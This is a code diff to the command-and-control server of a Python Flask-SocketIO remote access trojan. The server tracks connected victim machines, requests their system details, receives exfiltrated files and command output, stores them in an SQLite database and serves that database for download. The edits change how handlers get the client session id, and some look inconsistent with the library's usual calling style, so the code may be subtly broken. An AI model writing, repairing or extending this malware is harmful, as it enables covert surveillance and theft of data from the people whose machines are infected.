@@ -141,29 +141,29 @@ def download_db():
     return send_from_directory('.', 'rat_data.db')
 
 @socketio.on('connect')
-def handle_connect():
+def handle_connect(sid):
     """Handle new client connections."""
-    client_id = request.sid
+    client_id = sid
     connected_clients.add(client_id)
     print(f"[*] Client connected: {client_id}")
     emit('client_update', list(connected_clients), broadcast=True)
-    socketio.emit('request_client_info', broadcast=True)
+    emit('request_client_info', broadcast=True)
 
 @socketio.on('disconnect')
-def handle_disconnect():
+def handle_disconnect(sid):
     """Handle client disconnections."""
-    client_id = request.sid
+    client_id = sid
     if client_id in connected_clients:
         connected_clients.remove(client_id)
         client_info.pop(client_id, None)
         print(f"[*] Client disconnected: {client_id}")
         emit('client_update', list(connected_clients), broadcast=True)
-        socketio.emit('request_client_info', broadcast=True)
+        emit('request_client_info', broadcast=True)
 
 @socketio.on('exfil_data')
-def handle_exfil_data(data):
+def handle_exfil_data(sid, data):
     """Handle exfiltrated data from clients."""
-    client_id = request.sid
+    client_id = sid
     data = json.loads(data)
     data_type = data.get('type')
     conn = sqlite3.connect('rat_data.db')
@@ -184,7 +184,7 @@ def handle_exfil_data(data):
         c.execute("INSERT INTO exfiltrated_files (client_id, filename, content, timestamp) VALUES (?, ?, ?, ?)",
                   (client_id, filename, content, timestamp))
         print(f"[*] Exfiltrated data stored: {filename}")
-        socketio.emit('exfil_data', json.dumps({"type": "system_info", "filename": filename}), broadcast=True)
+        emit('exfil_data', json.dumps({"type": "system_info", "filename": filename}), broadcast=True)
 
     elif data_type == "command_output":
         command = data.get('command', 'unknown')
@@ -220,7 +220,7 @@ def handle_exfil_data(data):
     emit('client_info', client_info_list, broadcast=True)
 
 @socketio.on('request_client_info')
-def handle_request_client_info():
+def handle_request_client_info(sid):
     """Handle requests for client info from the web interface."""
     client_info_list = [
         {'id': cid, 'system': info}
